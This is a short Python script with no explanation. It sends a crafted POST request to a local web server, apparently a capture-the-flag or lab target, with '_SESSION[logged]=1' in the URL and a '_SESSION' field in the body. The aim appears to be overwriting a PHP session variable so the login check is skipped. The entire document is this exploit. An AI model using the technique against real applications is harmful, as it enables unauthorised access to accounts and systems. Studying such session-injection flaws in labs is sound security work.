import requests

url = "http://localhost:8888?_SESSION[logged]=1"
data = {"_SESSION":"1"}

res = requests.post(url, data)
print(res.text)
